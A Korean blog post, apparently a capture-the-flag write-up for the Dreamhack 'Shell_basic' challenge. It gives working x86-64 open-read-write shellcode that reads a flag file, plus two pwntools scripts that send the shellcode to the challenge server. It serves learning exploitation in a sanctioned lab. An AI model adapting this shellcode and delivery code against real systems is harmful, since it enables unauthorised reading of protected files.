---
layout: post
title:  "System Hackig Step 4-2: Shell_basic"
summary: 드림핵의 Shell_basic 문제 풀이
author: TouBVa
date: '2022-07-29 00:08:23 +09'
category: dreamhack_system_hacking
thumbnail: /assets/img/posts/syshack42/Untitled%205.jpeg
keywords: System Hacking, Shellcode, Pwnable
usemathjax: true
permalink: /blog/dreamhack_system_hacking/step4-2
---


* TOC
{:toc}

<br>

# STAGE 4-2: Shell_basic

- 이번 스테이지는 문제를 자율적으로 풀어보는 스테이지이다.
- 직전 스테이지에서 문제를 해결했던 방식으로 접근하며 문제 풀이 사고방식을 체화하는 것을 목표로 삼았다.

---

# 문제 풀이 과정 설정하기

1. 코드의 내용 확인
2. 익스플로잇 가능 부분 확인
3. 익스플로잇 당시의 스택 구조 체크
4. 페이로드 초안 작성
5. 익스플로잇 코드 작성

---

# 1. (1) 코드의 내용 확인

입력한 셸코드를 실행하는 프로그램이다. 맨 처음에는 문제에서 미리 설명해준 것을 이해하지 못하고 BOF를 쓰는 걸까? 싶었지만 코드를 찬찬히 읽어보니 그냥 내가 입력한 셸코드를 실행해 주는 프로그램이었다….

따라서 모두 뛰어넘고 5번을 수행하면 되겠다.

# 2. (5) 익스플로잇 코드 작성

내가 원하는 동작을 정리해 보자.

> cat /home/shell_basic/flag_name_is_loooooong
> 

그런데 cat을 실행하려면 쉘을 먼저 따야 한다. 즉, 쉘을 띄운다 → cat을 수행한다의 과정을 거쳐야 한다.  그러나, 쉘을 띄우는 과정에서 현재 내 수준으로는 무조건 `execve` , `execveat` , `exec` 등의 함수를 사용해야 하는데 코드 상에서도 그렇고, 문제 설명 상에서도 그렇고 main 함수 내부에서 해당 함수를 호출하는 것이 아니라면 실행 권한이 없게 설정되어 있다. 따라서 다른 방식을 찾아야 한다. 

두 번째 가능한 방법으로는 read/write 시스템 콜을 이용하는 것이다. 먼저 주어진 플래그의 경로에 있는 파일의 내용을 읽어온 후, 터미널에 write 하도록 하는 것이다. 직전에 만들어 보았던 orw 셸코드와 크게 차이가 있지는 않다.

어셈블리어로 먼저 작성한 후, 기계어로 변환한 값을 넣어야 주어진 코드가 실행할 수 있을 것이다.

![Untitled](/assets/img/posts/syshack42/Untitled.jpeg)

위의 사진과 같이 선언된 부분에 내가 작성한 코드가 올라가고, 해당 코드의 시작 부분부터 종료까지를 실행하는 구조이기 때문이다.(나도 태어나서 이런 식으로 포인터 자료형을 바꾸어 데이터를 코드로 읽게끔 하는 플로우는 처음 보았기 때문에, 코드를 이해하며 많이 배웠다)

## 어셈블리어로 작성하기

그럼 먼저 원하는 동작을 어셈블리어로 작성해 보자.

- 우리가 [여기](https://toubva.github.io/blog/system-hacking-step2/#/)에서 배웠던 text segment는 다른 말로 code segment라고도 한다. 즉, 아래의 어셈블리 코드는 실행할 수 있는 인스트럭션이 탑재되는 주소에 다이렉트로 접근하면서 시작한다.

```wasm

BITS 64
section .text ; text 섹션에 올라가는 것이므로
global _start ; NASM에게 시작 위치가 무엇으로 마킹되었는지를 알려준다

_start: 
; input string into the stack
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

; open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY, NULL)
mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

; read(fd, buf, 0x40)
mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

; write(1, buf, 0x40)
mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

; terminate the program
xor rdi, rdi
mov rax, 0x3c
syscall
```

- “gnooooool_si_eman_galf/cisab_llehs/emoh/”을 hex로 변환하면:
    
    676e6f6f6f6f6f6f 6c5f73695f656d61 6e5f67616c662f63 697361625f6c6c65 68732f656d6f682f
    
- 40byte이므로 한 번에 넣을 수가 없다. 8byte씩 5회에 나누어 레지스터에 넣고 스택에 push 해주는 과정을 거쳐야 한다.
- 스택에 들어간 텍스트 등의 데이터는 작은 주소에서 큰 주소로 읽고, 마지막의 한 chunk가(이 경우 8 byte) 8byte를 전부 채우지 못했을 경우 시스템은 거기에서 데이터가 끝났다고 인식한다고 추정했다.

## 기계어로 변환하기

.asm 파일을 .o 파일로 변환하고, 이후 .bin 파일로 변환하여 해당 바이너리 값을 hex로 변환한다.

```powershell
nasm -f elf64 shell_basic.asm // transfer to .o file
objdump -d shell_basic.o // disassemble .text section
objcopy --dump-section .text=shell_basic.bin shell_basic.o
xxd execve.bin
xxd -i execve.bin
```

![마지막 명령어까지 수행한 결과. hex값이 출력되었다.](/assets/img/posts/syshack42/Untitled%201.jpeg)

마지막 명령어까지 수행한 결과. hex값이 출력되었다.

그렇게 나온 hex값을 쉘코드 형태로 가공해 입력해 보았다. 그 결과,

![아니 외않되](/assets/img/posts/syshack42/Untitled%202.jpeg)

아니 외않되

안 되는 것을 확인할 수 있었다.

그렇다면 왜 안되는 것일까? 그 이유를 gdb를 붙여 알아보았다. 확인 결과, 내가 읽어오길 원하는 파일의 경로를 스택에 분명히 끊이지 않도록 잘 넣었음에도 불구하고 스택의 한 주소(8byte)만큼만 스트링을 읽어오는 것을 볼 수 있었다.

# 3. 문제 수정

## #1. NULL Byte

앞서 알아낸 바에 따르면, 현재 원하는 경로를 스택에 잘 넣었음에도 불구하고 경로 문자열 전체를 인식하지 못하는 문제가 있었다. 분명히 시스템 상으로 어떤 문자열이 있다면 그 끝을 인지하고, 문자열을 올바르게 불러오는 장치가 있을 것이라 생각했다. 그렇지 않다는 것은 굉장히 비논리적이기 때문이었다. 

만일 그러한 장치가 없다고 가정해 보자. 그렇다면 파일 경로 이름은 8bytes로 제한될 것이고, C 언어 상에서 문자열을 저장하고 불러오는 것은 원천적으로 불가능할 것이다.

여기까지 생각하니 생각나는 것이 있었다. 바로 C언어의 경우 문자열의 끝에 NULL 문자를 덧붙여 문자열의 끝을 표현한다는 점이었다. 따라서 해당 가설이 맞는지 스택에 가장 먼저 0x00 (ASCII 문자의 0번은 NULL byte이다)를 넣어두고 이하 원하는 값을 넣었다. 스택에 들어가는 값은 큰 주소부터 들어가고, 스택은 작은 주소부터 읽기 때문에 스택에 push 하는 값이 뒤집힌다는 점을 고려한 순서 지정이었다.

따라서 해당 가설을 반영한 어셈블리어 코드는 아래와 같았다.

```wasm

BITS 64
section .text ; text 섹션에 올라가는 것이므로
global _start ; NASM에게 시작 위치가 무엇으로 마킹되었는지를 알려준다

_start: 
; input string into the stack
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
.
.
.
(이하 상동)
.
.
.
```

해당 어셈블리어를 어셈블한 결과는 아래와 같았다.

![Untitled](/assets/img/posts/syshack42/Untitled%203.jpeg)

해당 결과를 파이프를 이용해 텍스트 파일에 저장하고, 쉘코드 형태로 가공한 후 원격 서버에 입력해 보았다.

그 결과,

![아외또않되](/assets/img/posts/syshack42/Untitled%204.jpeg)

아외또않되

안된다… C 언어로 짠 스켈레톤 코드에 올려서 gdb를 붙여서 확인해 봤는데, 분명히 제대로 되고 있었다. 심지어 flag 파일의 경로에 해당 파일을 만들어서 컴파일된 프로그램을 돌려 보았더니 제대로 파일의 값이 읽혀 나왔던 것까지 확인했는데 말이다.

![로컬 환경에서는 제대로 되는 모습을 확인.](/assets/img/posts/syshack42/Untitled%205.jpeg)

로컬 환경에서는 제대로 되는 모습을 확인.

## #2. Pwntools
그러다가 갑자기 생각났다. 설마, 프로그램 상에서 바이너리로 패킹해서 보내줘야 하는 걸까? 왠지 그럴 것 같았다. 네트워크를 통해 데이터가 전송될 경우 엔디안을 고려하지 않으면 원했던 것과는 정반대의 바이트가 갈 수 있다는 것을 BoB 수업 시간 때 배웠던 기억이 있었기 때문이었다.

그래서 python을 이용해 내가 원하는 데이터를 원격으로 보내고, 그 결과를 받는 프로그램을 짰다.

```python
from pwn import *
payload=b"\x41\xb8\x00\x00\x00\x00\x41\x50\x49\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x41\x50\x49\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x41\x50\x49\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x41\x50\x49\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x41\x50\x49\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x41\x50\x48\x89\xe7\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x8d\x74\x24\xc0\xba\x40\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x8d\x74\x24\xc0\xba\x30\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05"

p=remote("host3.dreamhack.games", 8603)
p.sendline(payload)
p.interactive()
```

그 결과, 성공했다! 경로가 지정하는 파일을 읽어 와 플래그를 확인할 수 있었다. 여기에 플래그는 올리지 않을 것이다. 드림핵에서 동일 문제를 푸는 사람들에게 스포일러가 될 수도 있기에…

또 다른 방식으로 코드를 짤 수 있을까 싶어 두 번째 방법도 제안해 본다. 이 또한 플래그를 가져올 수 있는 코드였다.

```python
from pwn import *

context.arch = 'amd64'

payload= '''
_start: 
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

xor rdi, rdi
mov rax, 0x3c
syscall
'''

payload=asm(payload)

p=remote("host3.dreamhack.games", 8603)
p.sendline(payload)
p.interactive()
```

내가 작성한 어셈블리 코드를 굳이 힘들게 쉘코드로 변환할 필요가 없어서 효율적이라 느낀 코드였다.

---

# 4. 앞으로 고칠 점

1. 익스플로잇을 만들고 나서, 로컬 환경 대상으로 gdb를 돌려볼 것.
    - 비슷한 과정을 반복할 필요가 없으므로 문제 풀이 시간이나 피드백 시간이 훨씬 단축될 것이다.
2. 원격 환경에 셸코드 등의 바이너리를 보낼 땐 반드시 pwntools의 send()를 사용할 것.
    - 제발 제발 제발 직접 입력하지 말고 프로그램을 이용하자.